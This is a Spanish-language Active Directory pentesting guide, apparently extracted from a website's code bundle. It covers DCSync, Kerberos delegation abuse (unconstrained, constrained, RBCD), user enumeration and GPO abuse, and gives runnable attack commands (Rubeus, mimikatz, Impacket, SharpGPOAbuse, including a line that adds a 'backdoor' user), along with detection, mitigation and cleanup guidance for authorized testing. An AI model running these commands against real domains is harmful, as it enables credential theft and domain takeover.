DCSync
\`\`\`

\`\`\`bash
ntlmrelayx.py -t ldap://<dc-ip> --escalate-user <usuario>
# o abrir una ldap_shell para ejecutar set_dcsync
ntlmrelayx.py -t ldap://<dc-ip> -i
\`\`\`

> No confundas **captura** de credenciales con **relay**. La *captura* obtiene un hash NetNTLMv2 para crackear offline; el *relay* reenvía la autenticación a otro servicio en tiempo real. Son ataques distintos — ver [NTLM Relay y Coercion](/pentesting/active-directory/ntlm-coercion).

***

## Certipy / Pass-the-Cert → DCSync

Escenario avanzado: si obtienes un **PFX** (certificado + clave privada) de un usuario privilegiado —por ejemplo vía ADCS o Shadow Credentials (ver [ADCS](/pentesting/active-directory/adcs))— puedes autenticarte con el certificado y, desde ahí, modificar permisos para DCSync.

\`\`\`text
PFX → Certificado → Clave privada → Autenticación (Pass-the-Cert)
    → Abuso de permisos (set_dcsync) → DCSync
\`\`\`

Separar el PFX en certificado y clave con Certipy:

\`\`\`bash
certipy-ad cert -pfx administrator.pfx -nokey -out user.crt
certipy-ad cert -pfx administrator.pfx -nocert -out user.key
\`\`\`

Y usarlos con \`passthecert.py\` para autenticarse por LDAPS con el certificado y, si procede, conceder DCSync (y luego retirarlo en el *cleanup*):

\`\`\`bash
passthecert.py -action ldap-shell -crt user.crt -key user.key \\
  -domain <dominio> -dc-ip <dc-ip>
\`\`\`

***

## ¿Qué obtengo con DCSync?

| Obtengo | Significa |
|---|---|
| **Administrator NTLM** | Hash de un administrador → Pass-the-Hash directo. |
| **krbtgt NTLM** | La clave del dominio → forjar **Golden Tickets**. |
| **Otros NTLM de usuario** | Material para PtH / análisis de privilegios. |
| **Claves Kerberos** | Material para ataques Kerberos (p. ej. Silver Tickets con claves de servicio). |

> Obtener un hash **no** equivale automáticamente a ser Domain Admin. El flujo correcto es: \`Credencial → validar → determinar privilegios (BloodHound) → PtH / Kerberos → movimiento lateral\`.

### DCSync → Pass the Hash

\`\`\`text
DCSync → NTLM Hash → Pass the Hash → SMB / WinRM / WMI / PsExec → Lateral Movement
\`\`\`

Ver [Movimiento lateral](/pentesting/active-directory/lateral-movement).

### DCSync → krbtgt → Golden Ticket

\`\`\`text
DCSync → krbtgt hash → Domain SID → Golden Ticket → TGT → Kerberos auth → Domain Dominance
\`\`\`

Ver [Golden / Silver Ticket](/pentesting/active-directory/tickets).

***

## Attack paths

**Escenario A — Replication Rights → Admin Hash → PtH**

\`\`\`text
Usuario de bajo privilegio → BloodHound → Replication Rights → DCSync
   → Administrator NTLM → Pass the Hash → Domain Admin
\`\`\`

**Escenario B — DCSync → krbtgt → Golden Ticket**

\`\`\`text
Usuario de bajo privilegio → BloodHound → DCSync → krbtgt → Golden Ticket → Domain Dominance
\`\`\`

**Escenario C — Credenciales → cuenta de servicio → lateral**

\`\`\`text
Usuario comprometido → Credential Dumping → cuenta de servicio
   → análisis de privilegios → Lateral Movement
\`\`\`

Más cadenas completas en [Attack Paths](/pentesting/active-directory/attack-paths).

***

## MITRE ATT&CK

DCSync se mapea como **OS Credential Dumping: DCSync — \`T1003.006\`** (táctica *Credential Access*).

> **Información adicional.** Según el contexto del ataque, DCSync se relaciona también con *Privilege Escalation*, *Defense Evasion* y *Valid Accounts* (uso de credenciales legítimas obtenidas). Este matiz es interpretación de contexto, no un identificador de técnica adicional.

***

## Detección

DCSync genera una operación de replicación que normalmente **solo** realizan los Domain Controllers entre sí. Señales:

- **Event ID 4662** sobre el objeto dominio con los GUID de \`DS-Replication-Get-Changes\` y \`DS-Replication-Get-Changes-All\`, originado por una identidad que **no** es un DC legítimo.
- **Event ID 1644** (consultas LDAP costosas/ineficientes) con auditoría del Directory Service activada.
- Auditoría de **Directory Service** y monitorización de **DRSUAPI / \`DsGetNCChanges\`**.
- **Network monitoring**: tráfico de replicación procedente de un host que no es DC.

### SIEM / Detection Engineering

Base de detección (pseudo-consulta):

\`\`\`text
EventID = 4662
AND Accesses IN (
    DS-Replication-Get-Changes,
    DS-Replication-Get-Changes-All
)
AND SubjectAccount NOT IN (lista de Domain Controllers)
\`\`\`

La idea: alertar sobre solicitudes de replicación procedentes de equipos/cuentas que **no son Domain Controllers** y sobre comportamiento anómalo de cuentas de servicio.

> **Información adicional.** Reglas específicas para Splunk, Microsoft Sentinel, Elastic o Sigma pueden construirse sobre esta misma lógica (Event 4662 + los GUID de replicación + exclusión de DCs). El contenido anterior es la base conceptual; las consultas por plataforma son aportación externa, no parte del documento fuente.

***

## Mitigación

- **Revisar las ACLs** del objeto dominio y los derechos de replicación periódicamente.
- **Mínimo privilegio**: eliminar \`DS-Replication-Get-Changes*\` de cuentas y grupos no privilegiados.
- **Tiered Administration** (modelo de niveles) y **segmentación** de los Domain Controllers.
- **Monitorización** y auditoría del Directory Service; **Microsoft Defender for Identity** detecta patrones de DCSync.
- Eliminar permisos innecesarios heredados de herramientas de backup/integraciones legacy.

***

## Cleanup

Toda modificación de AD debe revertirse:

- **Derechos DCSync concedidos**: \`bloodyAD ... remove dcsync <usuario>\`, \`del_dcsync\` en \`ldap_shell\`, o \`dacledit.py -action remove -rights DCSync ...\`.
- **Modificaciones de ACL** sobre el dominio u otros objetos.
- **Cuentas temporales** y **cuentas de equipo temporales** creadas.
- **Certificados temporales** (PFX/CRT/KEY) generados.
- **Modificaciones de GPO** temporales.
- Ficheros volcados (\`ntds\`, dumps) del sistema de pruebas.

***

## Troubleshooting

| Síntoma | Causa probable | Comprobación | Solución |
|---|---|---|---|
| \`Access Denied\` en DCSync | La cuenta no tiene derechos de replicación | Revisar ACL del dominio (BloodHound / dacledit) | Usar otra cuenta o conceder DCSync (y limpiar) |
| Errores RPC / DRSUAPI | Puerto 135/dinámicos filtrados o DC incorrecto | Confirmar IP del DC y conectividad RPC | Apuntar al DC correcto; revisar red/firewall |
| LDAP bind failed | Credenciales o DN incorrectos | Verificar usuario/password y Base DN | Corregir credenciales / formato \`dominio\\usuario\` |
| SMB authentication failure (\`STATUS_LOGON_FAILURE\`) | Credenciales inválidas | Validar con \`nxc smb\` | Corregir credenciales/hash |
| \`KRB_AP_ERR_SKEW\` (clock skew) | Desfase horario con el DC | Comparar hora con el DC | Sincronizar (\`ntpdate\` / \`faketime\`) |
| "Insufficient privileges" al conceder DCSync | Sin \`WriteDACL\` sobre el dominio | Revisar permisos del objeto dominio | Buscar otra ruta de [ACL Abuse](/pentesting/active-directory/acl-ace) |

***

## Decision tree

\`\`\`text
Tengo credenciales
     ↓
¿Puedo recolectar con BloodHound? → sí
     ↓
¿La cuenta tiene Replication Rights?
     ├── NO → buscar ACL abuse para conseguirlos (WriteDACL → set_dcsync)
     └── SÍ → DCSync
                ↓
            ¿Qué obtuve?
                ├── User Hash  → Pass the Hash
                ├── Admin Hash → Pass the Hash → Lateral Movement
                └── krbtgt     → Golden Ticket → Domain Dominance
\`\`\`

***

## Encuentro X → hago Y

| Encuentro | Siguiente paso |
|---|---|
| Replication Rights (BloodHound) | Confirmar y ejecutar DCSync |
| Edge \`DCSync\` / \`GetChanges\`+\`GetChangesAll\` | DCSync con secretsdump / NetExec / Mimikatz |
| \`Administrator\` NTLM | [Pass the Hash](/pentesting/active-directory/lateral-movement) |
| \`krbtgt\` NTLM | [Golden Ticket](/pentesting/active-directory/tickets) |
| Cuenta de servicio volcada | Analizar privilegios (BloodHound) |
| \`WriteDACL\` sobre el dominio | Conceder DCSync (set_dcsync) y limpiar |
| PFX de usuario privilegiado | Pass-the-Cert → set_dcsync → DCSync |
| Autenticación NTLM privilegiada forzable | Valorar relay a LDAP → DCSync |

***

## Checklist

- [ ] Identificar el DC
- [ ] Identificar el dominio
- [ ] Identificar la cuenta comprometida
- [ ] Ejecutar BloodHound
- [ ] Comprobar replication rights
- [ ] Comprobar ACLs del dominio
- [ ] Confirmar permisos DCSync
- [ ] Validar DCSync (prueba controlada)
- [ ] Extraer credenciales
- [ ] Identificar hashes privilegiados
- [ ] Identificar \`krbtgt\`
- [ ] Evaluar Pass the Hash
- [ ] Evaluar Pass the Ticket / Golden Ticket
- [ ] Evaluar movimiento lateral
- [ ] Documentar la evidencia
- [ ] Revertir modificaciones (cleanup)
`,Tr=`La delegación en Active Directory permite que un servicio actúe en nombre de un usuario para acceder a otros recursos. Mal configurada, es una de las vías de escalada y movimiento lateral más potentes en entornos de dominio, y conviene entenderla en sus tres variantes antes de intentar abusarla.

## ¿Qué es la delegación?

| Tipo | Quién controla la delegación | Riesgo |
|---|---|---|
| Unconstrained | El servicio (cualquier TGT que llegue queda cacheado) | Alto |
| Constrained | El servicio + una lista explícita de SPNs permitidos | Medio/Alto |
| RBCD (Resource-Based) | El recurso destino (vía \`msDS-AllowedToActOnBehalfOfOtherIdentity\`) | Alto según configuración |

***

## Unconstrained Delegation

### ¿Qué es?

Un equipo o servicio con el atributo \`TRUSTED_FOR_DELEGATION\` activado puede recibir y reenviar el TGT completo de cualquier usuario que se autentique contra él, no solo un ticket de servicio. El KDC, al emitir un TGS para ese servicio, adjunta una copia del TGT del usuario dentro del ticket.

### ¿Por qué funciona?

Kerberos confía en que el servicio marcado como "de confianza para delegación" necesita el TGT completo para poder solicitar acceso a otros recursos en nombre del usuario. Si el servicio está comprometido, el atacante hereda esa confianza total.

### Requisitos

- Acceso para enumerar atributos de objetos \`computer\` en el dominio (usuario de dominio autenticado suele bastar).
- Para explotarlo: control o ejecución de código sobre el equipo con unconstrained delegation.

### Enumeración

\`\`\`bash
findDelegation.py <dominio>/<usuario>:<password> -dc-ip <dc-ip>
\`\`\`

\`\`\`powershell
Get-DomainComputer -Unconstrained
\`\`\`

También es visible en BloodHound como el flag \`unconstraineddelegation\` sobre el nodo del equipo (ver [Análisis de rutas de ataque con BloodHound](/pentesting/active-directory/bloodhound)).

### Concepto

\`\`\`text
víctima se autentica contra el servicio con unconstrained delegation
    ↓
su TGT completo queda cacheado en LSASS del servidor
    ↓
el atacante (con acceso al servidor) extrae el TGT cacheado
    ↓
Pass-the-Ticket como la víctima
\`\`\`

### POC / Abuso

**Desde Windows (Rubeus/Mimikatz)**

\`\`\`powershell
Rubeus.exe monitor /interval:5
\`\`\`

\`\`\`powershell
Rubeus.exe dump /service:krbtgt
\`\`\`

\`\`\`powershell
mimikatz # sekurlsa::tickets /export
\`\`\`

### Resultado esperado

\`\`\`text
[*] Monitoring every 5 seconds for new TGTs
[+] 10/04/2026 TGT captured for ADMINISTRATOR@<DOMINIO>
\`\`\`

### Interpretación

Si se captura el TGT de una cuenta privilegiada (o del propio DC), se puede reutilizar directamente sin conocer la contraseña ni el hash.

### Siguiente paso

Reutilizar el TGT capturado con Pass-the-Ticket (ver [Tickets Kerberos](/pentesting/active-directory/tickets) y [Movimiento lateral](/pentesting/active-directory/lateral-movement)).

Esta técnica se combina habitualmente con coerción de autenticación para forzar a un Domain Controller a autenticarse contra el servidor con unconstrained delegation y así capturar su TGT (ver [NTLM Coercion](/pentesting/active-directory/ntlm-coercion)).

### Detección

Monitorizar el Event ID 4624 con logon type 3 hacia el servidor vulnerable, y el uso de \`sekurlsa::tickets\` o volcados de LSASS mediante EDR.

> **Solo laboratorio / entorno autorizado.** La captura de TGTs ajenos solo debe practicarse en entornos de prueba o con autorización explícita.

### Si falla

- \`KRB_AP_ERR_SKEW\`: diferencia de reloj entre atacante y DC; sincronizar con \`ntpdate <dc-ip>\` o \`faketime\`.
- Ningún TGT cacheado: el servicio no ha recibido autenticaciones recientes; esperar o forzar coerción.

***

## Constrained Delegation

### ¿Qué es?

El atributo \`msDS-AllowedToDelegateTo\` define una lista explícita de SPNs hacia los que una cuenta puede delegar, usando el protocolo S4U (Service-for-User). Limita el alcance frente a unconstrained, pero sigue siendo abusable.

### ¿Por qué funciona?

El servicio delegante puede solicitar, en nombre de cualquier usuario (incluso sin su contraseña), un ticket de servicio hacia los SPNs de la lista permitida, usando S4U2Self + S4U2Proxy.

### Requisitos

- Credenciales (contraseña o hash) de la cuenta configurada con constrained delegation.
- Conocer el SPN de destino listado en \`msDS-AllowedToDelegateTo\`.

### Enumeración

\`\`\`powershell
Get-DomainUser -TrustedToAuth
\`\`\`

También visible en BloodHound como \`AllowedToDelegate\` (ver [BloodHound](/pentesting/active-directory/bloodhound)).

### S4U2Self vs S4U2Proxy

\`\`\`text
S4U2Self: la cuenta delegante pide al KDC un ticket de servicio "hacia sí misma"
          en nombre del usuario objetivo (no requiere contraseña del usuario)
    ↓
S4U2Proxy: usando ese ticket, la cuenta delegante pide al KDC un ticket
          de servicio hacia el SPN permitido, impersonando al usuario objetivo
\`\`\`

### POC / Abuso

**Desde Linux (Impacket)**

\`\`\`bash
getST.py -spn <spn> -impersonate Administrator -dc-ip <dc-ip> <dominio>/<usuario>:<password>
\`\`\`

**Desde Windows (Rubeus)**

\`\`\`powershell
Rubeus.exe s4u /user:<usuario> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<spn> /ptt
\`\`\`

### Resultado esperado

\`\`\`text
[*] Saving ticket in Administrator.ccache
\`\`\`

### Interpretación

Se obtiene un ticket de servicio válido como Administrator (o el usuario impersonado) para el SPN delegado, lo que normalmente equivale a acceso administrativo sobre ese recurso concreto.

### Siguiente paso

Usar el ticket con \`export KRB5CCNAME=Administrator.ccache\` y acceder al servicio (ver [Movimiento lateral](/pentesting/active-directory/lateral-movement)).

### Detección

Event ID 4769 con el flag de delegación activado en el campo de opciones del ticket, correlado con la cuenta de servicio delegante.

### Si falla

- \`KDC_ERR_BADOPTION\`: el SPN solicitado no está en la lista \`msDS-AllowedToDelegateTo\`.
- \`KRB_AP_ERR_SKEW\`: sincronizar reloj con el DC.

***

## RBCD (Resource-Based Constrained Delegation)

### ¿Qué es?

A diferencia de los dos modelos anteriores, en RBCD es el **propio recurso destino** quien decide qué cuentas pueden delegar hacia él, mediante el atributo \`msDS-AllowedToActOnBehalfOfOtherIdentity\`. Esto significa que si un atacante tiene permisos de escritura sobre ese atributo en el objeto destino, puede configurar su propia delegación sin tocar el servicio origen.

### Conceptos clave

- **\`msDS-AllowedToActOnBehalfOfOtherIdentity\`**: atributo del objeto destino que lista qué cuentas pueden delegar en su nombre.
- **MachineAccountQuota**: por defecto, cualquier usuario autenticado de dominio puede crear hasta 10 cuentas de equipo (\`ms-DS-MachineAccountQuota = 10\`). Esto permite crear una cuenta propia para usarla como "delegante".
- **Computer Account**: una cuenta de equipo creada por el atacante actúa como la cuenta delegante.
- **S4U**: igual que en constrained delegation, se usa S4U2Self + S4U2Proxy para obtener el ticket final.

### Workflow

\`\`\`text
encontrar GenericWrite / GenericAll sobre el objeto equipo destino
    ↓
comprobar MachineAccountQuota (por defecto 10)
    ↓
crear una cuenta de equipo propia (FAKE$)
    ↓
configurar msDS-AllowedToActOnBehalfOfOtherIdentity en el destino → FAKE$
    ↓
pedir ticket S4U impersonando a un usuario privilegiado
    ↓
acceso al recurso destino como ese usuario
\`\`\`

### Requisitos

- Permiso \`GenericWrite\` o \`GenericAll\` sobre el objeto equipo destino (ver cómo obtenerlo en [ACL / ACE Abuse](/pentesting/active-directory/acl-ace)).
- MachineAccountQuota > 0, o ya disponer de una cuenta de equipo controlada.

### POC paso a paso

**Desde Linux (Impacket)**

1. Crear la cuenta de equipo falsa:

\`\`\`bash
addcomputer.py -computer-name 'FAKE$' -computer-pass 'Pass123!' <dominio>/<usuario>:<password> -dc-ip <dc-ip>
\`\`\`

2. Configurar RBCD sobre el equipo destino:

\`\`\`bash
rbcd.py -delegate-from 'FAKE$' -delegate-to '<TARGET>$' -action write <dominio>/<usuario>:<password>
\`\`\`

3. Solicitar el ticket de servicio impersonando a Administrator:

\`\`\`bash
getST.py -spn cifs/<target> -impersonate Administrator <dominio>/'FAKE$':'Pass123!'
\`\`\`

4. Usar el ticket obtenido:

\`\`\`bash
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <target>
\`\`\`

### Resultado esperado

\`\`\`text
[*] Successfully added machine account FAKE$ with password 'Pass123!'.
[*] Delegation rights modified successfully!
[*] Saving ticket in Administrator.ccache
[*] Requesting shares on <target>.....
[*] Found writable share ADMIN$
\`\`\`

### Interpretación

Se obtiene ejecución remota como Administrator sobre \`<target>\`, pese a no haber tenido credenciales directas de una cuenta privilegiada; todo se construyó a partir de permisos de escritura sobre el objeto equipo.

### Cleanup

\`\`\`bash
rbcd.py -delegate-from 'FAKE$' -delegate-to '<TARGET>$' -action remove <dominio>/<usuario>:<password>
\`\`\`

Eliminar también la cuenta de equipo creada:

\`\`\`bash
net rpc user delete 'FAKE$' -U '<dominio>/<usuario>%<password>' -S <dc-ip>
\`\`\`

> **Solo laboratorio / entorno autorizado.** Crear cuentas de equipo y modificar atributos de delegación altera objetos reales del dominio; hazlo solo en laboratorios o con autorización explícita, y revierte siempre los cambios.

### Detección

Event ID 4741 (creación de cuenta de equipo) y Event ID 5136 (modificación de \`msDS-AllowedToActOnBehalfOfOtherIdentity\`), especialmente si proviene de una cuenta de usuario estándar.

### Si falla

- \`KRB_AP_ERR_SKEW\`: sincronizar reloj con \`ntpdate <dc-ip>\` o \`faketime\`.
- \`addcomputer.py\` falla con "quota exceeded": MachineAccountQuota agotada; buscar una cuenta de equipo ya controlada.
- Acceso denegado al configurar RBCD: verificar que el permiso sobre el objeto destino es realmente \`GenericWrite\`/\`GenericAll\` (ver [ACL / ACE Abuse](/pentesting/active-directory/acl-ace)).

### Siguiente paso

Con el ticket obtenido, continuar con técnicas de [movimiento lateral](/pentesting/active-directory/lateral-movement) sobre el recurso comprometido.
`,Er=`La enumeración de usuarios, grupos y equipos es el paso que transforma un Domain Controller identificado en una lista concreta de objetivos. Esta página cubre las técnicas sin credenciales (reconocimiento inicial) y las que se habilitan una vez se dispone de credenciales válidas.

## Enumeración de usuarios (sin credenciales)

### RID Brute

\`\`\`bash
crackmapexec smb <dc-ip> --rid-brute 10000
\`\`\`

> **Nota.** Equivalente en NetExec: \`nxc smb <dc-ip> --rid-brute\`.

RID Brute explota el hecho de que muchos RPC endpoints permiten resolver RIDs (identificadores relativos) secuenciales a nombres de cuenta, incluso con una sesión null o con credenciales de invitado. El resultado es una lista de usuarios y grupos del dominio con su SID completo. Conviene guardar la salida en un fichero y extraer solo los nombres de usuario para usarlos como lista en la siguiente fase (password spraying, Kerbrute, etc.).

### Kerbrute

\`\`\`bash
kerbrute userenum -d <dominio> --dc <dc-ip> users.txt
\`\`\`

Kerbrute valida usuarios enviando peticiones de pre-autenticación Kerberos (AS-REQ) sin completar el proceso de login, por lo que normalmente no genera intentos de contraseña fallida ni bloquea cuentas. Devuelve qué nombres de \`users.txt\` corresponden a cuentas reales del dominio. La lista resultante de usuarios válidos alimenta directamente los ataques de password spraying y AS-REP Roasting.

### RPC (null session)

\`\`\`bash
rpcclient -U "" -N <dc-ip>
\`\`\`

Dentro de la sesión interactiva de \`rpcclient\`:

\`\`\`text
enumdomusers
enumdomgroups
querydominfo
\`\`\`

Una sesión RPC null (sin usuario ni contraseña) puede estar permitida en configuraciones antiguas o mal hardenizadas. \`enumdomusers\` lista los usuarios del dominio, \`enumdomgroups\` lista los grupos, y \`querydominfo\` devuelve información general del dominio (nombre, número de usuarios, política de bloqueo). Cuando esta sesión null está disponible es una de las formas más rápidas de obtener una lista inicial de usuarios.

***

## Enumeración autenticada

Disponer de unas credenciales válidas (\`DOMAIN\\usuario\` + contraseña, o un hash NTLM) cambia completamente el alcance de la enumeración: en lugar de depender de sesiones null o fuerza bruta de RIDs, se puede consultar el directorio directamente.

\`\`\`bash
crackmapexec smb <target> -u <usuario> -p <password> --users
crackmapexec smb <target> -u <usuario> -p <password> --groups
crackmapexec smb <target> -u <usuario> -p <password> --shares
crackmapexec smb <target> -u <usuario> -p <password> --computers
\`\`\`

> **Nota.** Mismas flags en NetExec: \`nxc smb <target> -u <usuario> -p <password> --users\`, etc.

- \`--users\` devuelve la lista completa de cuentas de usuario del dominio, con información como el último cambio de contraseña o si la cuenta está deshabilitada.
- \`--groups\` devuelve los grupos y, según la versión, su número de miembros.
- \`--shares\` devuelve los recursos compartidos SMB visibles para esa cuenta y el nivel de acceso (READ/WRITE) sobre cada uno.
- \`--computers\` devuelve los equipos unidos al dominio, útil para localizar servidores, estaciones de trabajo y el propio DC.

Con Impacket, la enumeración de usuarios autenticada también puede hacerse así:

\`\`\`bash
GetADUsers.py <dominio>/<usuario>:<password> -all -dc-ip <dc-ip>
\`\`\`

Este comando consulta LDAP directamente y devuelve, para cada usuario, atributos como el último logon y la fecha de expiración de contraseña, en un formato más detallado que el listado simple de CME/nxc.

***

## Equipos y Domain Controllers

\`\`\`bash
crackmapexec smb <target> -u <usuario> -p <password> --computers
\`\`\`

Este listado de equipos es el punto de partida para localizar todos los Domain Controllers del dominio (puede haber más de uno) y diferenciarlos de estaciones de trabajo o servidores miembro. Para una visión más completa de qué equipo hace qué rol, y de las sesiones activas en cada uno, la vía recomendada es recolectar datos con BloodHound o consultar LDAP directamente, ya que ambos exponen el atributo que marca a un equipo como Domain Controller sin ambigüedad.

***

Los usuarios y equipos recolectados en esta fase alimentan directamente las siguientes: usar la lista de usuarios contra [LDAP](/pentesting/active-directory/ldap) para filtrar cuentas con SPN o AS-REP roasteables, lanzar [ataques de contraseña](/pentesting/active-directory/password-attacks) (spraying, fuerza bruta controlada) sobre los usuarios válidos, o explorar directamente [Kerberos](/pentesting/active-directory/kerberos) para Kerberoasting y AS-REP Roasting.
`,Dr=`Las GPO (Group Policy Objects) aplican configuración a todos los usuarios y equipos dentro de su ámbito, lo que convierte un permiso de escritura mal configurado sobre una GPO en una vía directa de escalada o persistencia sobre todos esos objetos.

## ¿Qué es una GPO?

Una **GPO** es un conjunto de configuraciones (software, scripts, tareas programadas, asignación de derechos, políticas de seguridad) que Active Directory distribuye a los equipos y usuarios afectados. Una **GPO Link** es la asociación entre una GPO y un contenedor del directorio (una **OU**, un dominio o un sitio); todo objeto dentro de ese contenedor recibe la configuración de la GPO enlazada, salvo bloqueo explícito de herencia.

Si un atacante puede **modificar** una GPO que ya está enlazada a una OU, no necesita enlazar nada nuevo: basta con editar el contenido de la GPO para que, en el siguiente ciclo de actualización (\`gpupdate\`, habitualmente cada 90–120 minutos), se aplique a **todos** los usuarios y equipos del ámbito de esa OU. Esto la convierte en una ruta de escalada muy potente cuando el ámbito incluye equipos con administradores de dominio conectados o servidores críticos.

***

## Enumeración

**Windows (PowerView)**

\`\`\`powershell
Get-DomainGPO
Get-DomainOU
Get-DomainGPO -Identity <gpo> | Get-ObjectAcl -ResolveGUIDs
\`\`\`

El último comando muestra quién tiene permisos de escritura (\`GenericAll\`, \`GenericWrite\`, \`WriteDacl\`...) sobre una GPO concreta — ver [acl-ace](/pentesting/active-directory/acl-ace) para el detalle de cada permiso.

**BloodHound**

El grafo incluye nodos de tipo GPO y sus edges de permisos (\`GenericAll\`, \`GenericWrite\`, \`WriteDacl\` sobre un nodo GPO) junto con los enlaces \`GPLink\` hacia las OUs afectadas, lo que permite ver de un vistazo qué objetos quedarían afectados por un abuso (ver [bloodhound](/pentesting/active-directory/bloodhound)).

***

## Abuso

> **Solo laboratorio / entorno autorizado.** Modificar una GPO afecta potencialmente a todos los usuarios y equipos de su ámbito. Verifica siempre qué OUs están enlazadas antes de tocar nada, y ejecuta esto solo con autorización expresa.

**Requisito previo.** Antes de cualquier comando de abuso, confirma que tienes derechos de escritura suficientes sobre la GPO objetivo (\`WriteDacl\`, \`GenericWrite\` o \`GenericAll\` — ver [acl-ace](/pentesting/active-directory/acl-ace) para cómo obtenerlos si no los tienes ya).

**Desde Windows (SharpGPOAbuse)**

Añadir un usuario como administrador local en todos los equipos del ámbito:

\`\`\`powershell
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <usuario> --GPOName "<gpo>"
\`\`\`

Añadir una tarea programada inmediata (Immediate Task) que ejecute un comando:

\`\`\`powershell
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author <dominio>\\<usuario> --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add" --GPOName "<gpo>"
\`\`\`

(\`--AddUserTask\` aplica el mismo principio a los usuarios del ámbito en lugar de a los equipos).

Modificar la asignación de derechos de usuario (User Rights Assignment) para, por ejemplo, conceder \`SeDebugPrivilege\` o inicio de sesión como servicio a una cuenta controlada — se edita a través de la misma herramienta o directamente en la plantilla de seguridad de la GPO.

**Desde Linux (pygpoabuse)**

\`\`\`bash
pygpoabuse <dominio>/<usuario>:<password> -gpo-id <id>
\`\`\`

**POCs resumidos**

- **Immediate Task** — la vía más directa: se ejecuta en el próximo ciclo de \`gpupdate\` sin esperar a reinicio, ideal para obtener ejecución de comandos en los equipos del ámbito.
- **Local Admin** — añade al usuario controlado al grupo de administradores locales de cada equipo afectado; útil para persistencia y movimiento lateral posterior (ver [lateral-movement](/pentesting/active-directory/lateral-movement)).
- **User Rights Assignment** — concede derechos específicos (depuración, inicio de sesión local/remoto, actuar como sistema) sin pasar por el grupo de administradores, más discreto pero igualmente peligroso.

***

## Cleanup

> **Cleanup.** Revertir siempre la modificación realizada:
> - Eliminar la tarea programada o el usuario añadido con las opciones de reversión de la misma herramienta (\`SharpGPOAbuse.exe\` admite revertir algunas acciones; en su defecto, editar la GPO manualmente desde \`gpmc.msc\` o con PowerView).
> - Si se añadió una cuenta local, eliminarla del equipo o de la GPO.
> - Forzar la actualización inmediata tras revertir con \`gpupdate /force\` en los equipos afectados, para no dejar la configuración maliciosa pendiente de aplicar.

**Detección.** Cambios en una GPO generan eventos 5136/5137 sobre objetos \`groupPolicyContainer\`, y la ejecución de una Immediate Task queda registrada como una tarea programada creada fuera de los canales habituales (evento 4698) en los equipos del ámbito.

Para obtener primero los permisos de escritura sobre la GPO si aún no los tienes, consulta [acl-ace](/pentesting/active-directory/acl-ace); para explotar el acceso resultante en los equipos del ámbito, consulta [lateral-movement](/pentesting/active-directory/lateral-movement).
`,Or=`Active Directory (AD) es el servicio de directorio de Microsoft usado por la gran mayoría de organizaciones para centralizar la autenticación, la autorización y la gestión de usuarios, equipos y recursos. Entender sus piezas básicas y, sobre todo, el modelo de relaciones que las conecta es el punto de partida de cualquier ejercicio de pentesting interno o de preparación para la OSCP.

## Conceptos clave

| Término | Qué es |
|---|---|
| Active Directory | Servicio de directorio de Microsoft que almacena objetos (usuarios, equipos, grupos) y gestiona autenticación/autorización en una red Windows. |
| Domain | Unidad administrativa lógica de AD; agrupa usuarios, equipos y políticas bajo un mismo espacio de nombres y una misma base de datos de directorio. |
| Domain Controller (DC) | Servidor que almacena la base de datos del dominio (NTDS.dit) y responde a peticiones de autenticación Kerberos/NTLM y consultas LDAP. |
| Forest | Conjunto de uno o más dominios que comparten un esquema, un catálogo global y relaciones de confianza entre sí. |
| Tree | Conjunto de dominios dentro de un forest que comparten un espacio de nombres DNS contiguo. |
| Trust | Relación de confianza entre dominios o forests que permite a los usuarios de uno autenticarse en recursos del otro. |
| OU (Organizational Unit) | Contenedor dentro del dominio usado para organizar objetos y aplicar GPOs de forma granular. |
| Usuario | Objeto que representa una identidad (persona o servicio) con credenciales propias dentro del dominio. |
| Grupo | Objeto que agrupa usuarios u otros grupos para asignar permisos o privilegios de forma colectiva. |
| Computer Object | Objeto en el directorio que representa una máquina unida al dominio, con su propia cuenta y contraseña gestionada por AD. |
| LDAP | Protocolo (puerto 389/636) usado para consultar y modificar objetos del directorio. |
| Kerberos | Protocolo de autenticación por tickets (puerto 88) usado como mecanismo principal en AD. |
| NTLM | Protocolo de autenticación challenge-response heredado, aún presente como fallback en muchos entornos. |
| SMB | Protocolo de compartición de archivos (puerto 445) muy usado también para autenticación y enumeración. |
| RPC | Mecanismo de llamada a procedimiento remoto (puerto 135 y rangos dinámicos) usado por muchos servicios de Windows/AD. |
| SPN (Service Principal Name) | Identificador que vincula una cuenta de servicio con el servicio concreto que ofrece; clave en ataques Kerberoasting. |
| GPO (Group Policy Object) | Conjunto de políticas que se aplican a usuarios/equipos dentro de una OU, dominio o sitio. |
| ACL | Lista de control de acceso que define quién puede hacer qué sobre un objeto del directorio. |
| ACE | Entrada individual dentro de una ACL que concede o deniega un permiso concreto a un principal. |
| krbtgt | Cuenta de servicio especial usada por el KDC para cifrar los tickets Kerberos (TGTs); su hash permite falsificar tickets (Golden Ticket). |
| NTDS.dit | Base de datos del Domain Controller donde se almacenan todos los objetos del dominio, incluidos los hashes de contraseñas. |

***

## El mindset de ataque en AD

A diferencia de un pentest de máquinas aisladas, en Active Directory el objetivo no es analizar cada host por separado, sino entender las **relaciones** entre usuarios, grupos, equipos, sesiones y permisos. Una credencial con privilegios bajos puede tener, aun así, una ruta indirecta hacia privilegios altos a través de esa red de relaciones.

\`\`\`text
Users
  ↓
Groups
  ↓
Computers
  ↓
Sessions
  ↓
Permissions
  ↓
Services
  ↓
Credentials
  ↓
Attack Paths
  ↓
Domain Admin
\`\`\`

Cada capa alimenta a la siguiente: un usuario pertenece a grupos, esos grupos tienen acceso a ciertos equipos, en esos equipos hay sesiones activas de otras cuentas, esas cuentas tienen permisos sobre objetos o servicios, esos servicios usan credenciales, y la combinación de todo ello forma rutas de ataque (**Attack Paths**) que no siempre son evidentes a simple vista.

Este es el motivo por el que herramientas como BloodHound son centrales en AD: en lugar de enumerar manualmente cada relación, recolectan los datos del directorio y las sesiones, y calculan automáticamente el camino más corto desde una credencial inicial hasta Domain Admin. Ver [BloodHound](/pentesting/active-directory/bloodhound) para el flujo completo de recolección y análisis.

> **Nota de compatibilidad.** 445 abierto no implica host vulnerable, igual que encontrar el nombre de dominio no confirma qué máquina es el DC: cada hallazgo debe verificarse antes de construir hipótesis sobre él.

***

## Cómo usar esta sección

